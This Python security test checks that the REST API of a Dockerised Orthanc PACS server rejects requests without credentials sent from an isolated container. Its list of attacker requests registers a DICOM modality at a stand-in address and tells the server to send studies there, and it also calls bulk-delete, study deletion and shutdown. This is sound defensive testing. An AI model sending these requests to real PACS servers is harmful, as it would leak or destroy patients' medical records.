"""Remote clients must not use the Orthanc REST API without credentials.

Boots the shipped orthanc/docker-compose.yml stack and calls the REST API from
a container that is not attached to that stack's network. Requests send no
Authorization header.

The test fails while any of those calls receives an HTTP status other than 401
or 403. Removing the host port mapping, binding it to loopback only, or
requiring credentials makes the same calls pass.

Run from the repository root:

    python3 orthanc/rest_exposure_test.py

Requires Docker and the images named in orthanc/docker-compose.yml.
"""

import json
import os
import socket
import subprocess
import time
import unittest
import urllib.error
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
COMPOSE_FILE = ROOT / "orthanc" / "docker-compose.yml"
PROJECT = "pacs-orthanc-exposure"
ATTACKER_NETWORK = "pacs-orthanc-attacker"
IMAGE = "orthancteam/orthanc:24.12.0-full"
LOOPBACK_HOSTS = {"127.0.0.1", "::1"}
WILDCARD_HOSTS = {"0.0.0.0", "::"}

# Routes named by the exposure and the matching api-pacs Orthanc client calls.
# Other Orthanc routes are gated by the same HTTP server and are not each called.
OPERATIONS = [
    {"method": "GET", "path": "/patients"},
    {"method": "GET", "path": "/studies"},
    {"method": "GET", "path": "/instances"},
    {
        "method": "POST",
        "path": "/instances",
        "body": "not-a-dicom",
        "headers": {"Content-Type": "application/dicom"},
    },
    {"method": "GET", "path": "/instances/00000000-0000-0000-0000-000000000000/file"},
    {
        "method": "PUT",
        "path": "/modalities/attacker",
        "body": json.dumps(["ATTACKER", "203.0.113.10", 11112]),
        "headers": {"Content-Type": "application/json"},
    },
    {
        "method": "POST",
        "path": "/modalities/attacker/store",
        "body": json.dumps({"Resources": []}),
        "headers": {"Content-Type": "application/json"},
    },
    {
        "method": "POST",
        "path": "/modalities/attacker/store-straight",
        "body": "not-a-dicom",
        "headers": {"Content-Type": "application/dicom"},
    },
    {
        "method": "POST",
        "path": "/modalities/hospital/move",
        "body": json.dumps(
            {"Level": "Study", "Resources": [{"StudyInstanceUID": "1.2.3"}]}
        ),
        "headers": {"Content-Type": "application/json"},
    },
    {
        "method": "POST",
        "path": "/modalities/attacker/echo",
        "body": json.dumps({"CheckFind": False, "Timeout": 1}),
        "headers": {"Content-Type": "application/json"},
    },
    {"method": "GET", "path": "/modalities?expand=true"},
    {"method": "DELETE", "path": "/modalities/attacker"},
    {"method": "DELETE", "path": "/studies/00000000-0000-0000-0000-000000000000"},
    {
        "method": "POST",
        "path": "/tools/find",
        "body": json.dumps({"Level": "Study", "Query": {}}),
        "headers": {"Content-Type": "application/json"},
    },
    {
        "method": "POST",
        "path": "/tools/bulk-delete",
        "body": json.dumps({"Resources": []}),
        "headers": {"Content-Type": "application/json"},
    },
    {"method": "POST", "path": "/tools/shutdown"},
]

ATTACKER_SCRIPT = r"""
import json, sys, urllib.error, urllib.request
base = sys.argv[1]
ops = json.load(sys.stdin)
results = []
for op in ops:
    data = None if op.get("body") is None else op["body"].encode()
    headers = dict(op.get("headers") or {})
    headers.pop("Authorization", None)
    request = urllib.request.Request(
        base + op["path"], data=data, method=op["method"], headers=headers
    )
    try:
        with urllib.request.urlopen(request, timeout=8) as response:
            results.append({"method": op["method"], "path": op["path"], "status": response.status})
    except urllib.error.HTTPError as error:
        results.append({"method": op["method"], "path": op["path"], "status": error.code})
    except Exception as error:
        results.append({
            "method": op["method"],
            "path": op["path"],
            "error": "%s: %s" % (type(error).__name__, error),
        })
json.dump(results, sys.stdout)
"""


def run(args, **kwargs):
    return subprocess.run(args, check=False, text=True, capture_output=True, **kwargs)


def compose(args, env):
    return run(
        ["docker", "compose", "-f", str(COMPOSE_FILE), "-p", PROJECT, *args],
        env=env,
        cwd=ROOT,
    )


def parse_binding(line):
    line = line.strip()
    if line.startswith("["):
        host, _, rest = line[1:].partition("]")
        return host, rest.lstrip(":")
    host, _, port = line.rpartition(":")
    return host, port


class OrthancRestExposureTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.env = os.environ.copy()
        cls.env["ORTHANC_DICOM_AET"] = "PACS_AI"
        cls.env["ORTHANC_DICOM_PORT"] = "4242"
        refuse_to_replace_foreign_containers(["orthanc", "orthanc-index"])
        run(["docker", "rm", "-f", "orthanc", "orthanc-index"])
        run(["docker", "network", "rm", ATTACKER_NETWORK])
        down = compose(["down", "-v", "--remove-orphans"], cls.env)
        if down.returncode != 0:
            raise AssertionError("docker compose down failed: %s" % down.stderr)
        up = compose(["up", "-d"], cls.env)
        if up.returncode != 0:
            raise AssertionError("docker compose up failed:\n%s" % up.stderr)
        created = run(["docker", "network", "create", ATTACKER_NETWORK])
        if created.returncode != 0:
            raise AssertionError(created.stderr)
        cls.gateway = subprocess.check_output(
            [
                "docker",
                "network",
                "inspect",
                ATTACKER_NETWORK,
                "--format",
                "{{(index .IPAM.Config 0).Gateway}}",
            ],
            text=True,
        ).strip()
        cls._wait_until_http_responds()

    @classmethod
    def tearDownClass(cls):
        compose(["down", "-v", "--remove-orphans"], cls.env)
        run(["docker", "network", "rm", ATTACKER_NETWORK])

    @classmethod
    def _wait_until_http_responds(cls):
        probe = (
            "import urllib.request, urllib.error\n"
            "try:\n"
            "    urllib.request.urlopen('http://127.0.0.1:8042/system', timeout=3)\n"
            "    print('up')\n"
            "except urllib.error.HTTPError:\n"
            "    print('up')\n"
            "except Exception:\n"
            "    print('down')\n"
        )
        deadline = time.time() + 90
        last = ""
        while time.time() < deadline:
            result = compose(["exec", "-T", "orthanc", "python3", "-c", probe], cls.env)
            last = (result.stdout or "") + (result.stderr or "")
            if result.returncode == 0 and "up" in result.stdout:
                return
            time.sleep(2)
        raise AssertionError("Orthanc did not accept HTTP inside the compose network:\n%s" % last)

    def published_bindings(self):
        result = run(["docker", "port", "orthanc", "8042"])
        self.assertEqual(result.returncode, 0, result.stderr)
        bindings = []
        for line in result.stdout.splitlines():
            if line.strip():
                bindings.append(parse_binding(line))
        return bindings

    def remote_targets(self, bindings):
        targets = []
        for host, port in bindings:
            if host in WILDCARD_HOSTS:
                targets.append((self.gateway, port))
            elif host not in LOOPBACK_HOSTS:
                targets.append((host, port))
        # Stable, unique.
        seen = []
        for target in targets:
            if target not in seen:
                seen.append(target)
        return seen

    def call_from_attacker(self, host, port, operations):
        base = "http://%s:%s" % (host, port)
        result = run(
            [
                "docker",
                "run",
                "--rm",
                "-i",
                "--network",
                ATTACKER_NETWORK,
                "--entrypoint",
                "python3",
                IMAGE,
                "-c",
                ATTACKER_SCRIPT,
                base,
            ],
            input=json.dumps(operations),
        )
        self.assertEqual(
            result.returncode,
            0,
            "attacker container failed:\n%s\n%s" % (result.stdout, result.stderr),
        )
        return json.loads(result.stdout)

    def test_remote_unauthenticated_orthanc_rest_is_rejected(self):
        bindings = self.published_bindings()
        targets = self.remote_targets(bindings)
        if not targets:
            # No non-loopback publish. A stray listener on the gateway is still a failure.
            targets = [(self.gateway, "8042")]
            expect_connection = False
        else:
            expect_connection = True

        accepted = []
        reached = False
        for host, port in targets:
            for outcome in self.call_from_attacker(host, port, OPERATIONS):
                if "status" not in outcome:
                    continue
                reached = True
                if outcome["status"] not in (401, 403):
                    accepted.append(
                        "%s %s -> HTTP %s via %s:%s"
                        % (outcome["method"], outcome["path"], outcome["status"], host, port)
                    )

        if expect_connection and not reached:
            self.fail(
                "Orthanc publishes %s but no request from %s reached it"
                % (bindings, ATTACKER_NETWORK)
            )
        self.assertEqual(
            accepted,
            [],
            "unauthenticated Orthanc REST calls were accepted:\n" + "\n".join(accepted),
        )

    def test_published_binding_is_not_only_reported(self):
        # Connecting with the host stack to a non-loopback address must not succeed
        # anonymously either. This catches a publish on 0.0.0.0 that the other
        # network namespace cannot route to.
        bindings = self.published_bindings()
        addresses = []
        for host, port in bindings:
            if host in WILDCARD_HOSTS:
                addresses.append((primary_ipv4(), port))
            elif host not in LOOPBACK_HOSTS:
                addresses.append((host, port))
        deduped = []
        for address in addresses:
            if address not in deduped:
                deduped.append(address)
        addresses = deduped
        if not addresses:
            return
        accepted = []
        for host, port in addresses:
            status = host_status(host, port, "GET", "/patients")
            if status is None:
                continue
            if status not in (401, 403):
                accepted.append("GET /patients -> HTTP %s via %s:%s" % (status, host, port))
        self.assertEqual(accepted, [], "\n".join(accepted))


def refuse_to_replace_foreign_containers(names):
    """The compose file pins container_name, so the test removes containers by name.
    Refuse when one of them belongs to another compose project (for example a
    production stack on the same Docker host) instead of deleting it."""
    for name in names:
        result = run(
            [
                "docker",
                "inspect",
                "--format",
                '{{ index .Config.Labels "com.docker.compose.project" }}',
                name,
            ]
        )
        if result.returncode != 0:
            continue  # no such container
        project = result.stdout.strip()
        if project != PROJECT:
            raise unittest.SkipTest(
                "container %r belongs to compose project %r; run this test on a "
                "Docker host without a PACS-AI stack (for example docker:dind)"
                % (name, project or "<none>")
            )


def primary_ipv4():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.connect(("192.0.2.1", 9))
        return sock.getsockname()[0]
    finally:
        sock.close()


def host_status(host, port, method, path):
    request = urllib.request.Request(
        "http://%s:%s%s" % (host, port, path), method=method
    )
    try:
        with urllib.request.urlopen(request, timeout=5) as response:
            return response.status
    except urllib.error.HTTPError as error:
        return error.code
    except (OSError, urllib.error.URLError):
        return None


if __name__ == "__main__":
    unittest.main()
